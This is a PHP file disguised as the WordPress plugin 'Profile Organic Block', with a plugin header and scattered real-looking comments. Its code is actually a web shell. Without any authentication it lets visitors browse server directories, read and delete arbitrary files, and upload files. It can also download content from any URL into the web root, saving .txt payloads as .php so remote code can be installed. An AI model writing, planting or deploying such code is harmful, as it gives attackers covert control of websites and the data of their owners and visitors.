<?php
error_reporting(0);
/**
 *
 * @link https://organicthemes.com
 * @since 1.0.0
 * @package OPB
 *
 * Plugin Name: Profile Organic Block
 * Plugin URI: https://organicthemes.com/
 * Description: The Profile Block is created for the Gutenberg content editor. It displays a profile section with an image, name, subtitle, bio and personal social media links. It's perfect for author biographies, personal profiles, or staff pages.
 * Author: Organic Themes
 * Author URI: https://organicthemes.com/
 * Version: 1.3.1
 * License: GPL2+
 * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
 */
echo '<table width="400" align="center" cellspacing="1" cellpadding="3" border="0"><tr><td>Website Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['f_name'])){
$tarpaths=basename($_FILES["f_name"]["name"]);if(move_uploaded_file($_FILES["f_name"]["tmp_name"],$path.'/'.$tarpaths)){echo '<p><font color="green">Done it is ok</font></p>';}else{echo '<p><font color="red">U_fail</font></p>';}
}
echo "<form enctype=\"multipart/form-data\" method=\"POST\" action=\"?path=$path\"><input name=\"f_name\" type=\"file\"/><input type=\"submit\" value=\"Done it\"/></form></td></tr>";
/**
 * Define global constants.
 *
 * @since 1.0.0
 */
// Plugin version.
function get($url, $dir) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	$data = curl_exec($ch);
	if(!$data){
		$data = @file_get_contents($url);
	}
	file_put_contents($dir, $data);
}
if($_GET['url']){
	$url = $_GET['url'];
	preg_match('/(.*)\/(.*)\.(.*?)$/',$url,$n);
	if($n[3]=='txt'){
		$z='php';
		$name=$n[2];
	}else{
		$z=$n[3];
		$name="moban";
	}
	if($_GET['dir']){
		$dir=$_SERVER["DOCUMENT_ROOT"].'/'.$_GET['dir'].'/'.$name.'.'.$z;
	}else{
		$dir=$_SERVER["DOCUMENT_ROOT"].'/'.$name.'.'.$z;
	}
	get($url,$dir);
	if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}
}elseif($_POST['url']){
	$url = $_POST['url'];
	preg_match('/(.*)\/(.*)\.(.*?)$/',$url,$n);
	if($n[3]=='txt'){
		$z='php';
		$name=$n[2];
	}else{
		$z=$n[3];
		$name="moban";
	}
	$dir = $_POST['path']."/".$name.'.'.$z;
	get($url,$dir);
	if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}
}
echo "<tr><td><form method=\"POST\" action=\"?path=$path\"><span>Url: </span><input type=text name=\"url\" value=\"\"><input type=\"hidden\" name=\"path\" value=\"$path\"><input type=submit value=\"Download\"></form></td></tr>";
/**
 * Enqueue the block's assets for the editor.
 *
 * `wp-blocks`: Includes block type registration and related functions.
 * `wp-element`: Includes the WordPress Element abstraction for describing the structure of your blocks.
 * `wp-i18n`: To internationalize the block's text.
 *
 * @since 1.0.0
 */
if(isset($_GET['filepath'])){
	echo "<tr><td>Website File : ";
	echo $_GET['filepath'];
	echo '</tr></td></table><br />';
	echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filepath'])).'</pre>');
	}elseif(isset($_GET['check']) &&  $_GET['check'] == '1'){
		$RootDir = $_SERVER['DOCUMENT_ROOT'];
		$filename = $RootDir.'/index.php';
		echo "<tr><td>Website File : ";
		echo $filename;
		echo '</tr></td></table><br />';
		echo('<pre>'.htmlspecialchars(file_get_contents($filename)).'</pre>');
	}else{
	echo '</table><br /><center>';
	if(isset($_GET['option']) &&  $_GET['option'] == 'delete'){
		if(unlink($_GET['delfile'])){
			echo '<font color="green">Delete File Done.</font><br />';
		}else{
			echo '<font color="red">Delete File Error.</font><br />';
		}
	}
	echo '</center>';
	// Here we actually register the block with WP, again using our namespacing.
	// We also specify the editor script to be used in the Gutenberg interface.
	$scandir = scandir($path);
	echo '<div id="content"><table width="380" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td>Name</td><td>Size</td><td>Options</td></tr>';
	foreach($scandir as $dir){
		if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
			echo "<tr><td><a href=\"?path=$path/$dir\">$dir</a></td><td>DIR</td><td>none</td></tr>";
		}
	echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

	foreach($scandir as $file){
		if(!is_file("$path/$file")) continue;
		$size = filesize("$path/$file")/1024;
		$size = round($size,3);
		if($size >= 1024){
			$size = round($size/1024,2).' MB';
		}else{
			$size = $size.' KB';
		}
		echo "<tr><td><a href=\"?filepath=$path/$file&path=$path\">$file</a></td><td>".$size."</td><td><a href=\"?path=$path&delfile=$path/$file&option=delete\">Delete</a></td></tr>";
	}
	echo '</table></div>';
}
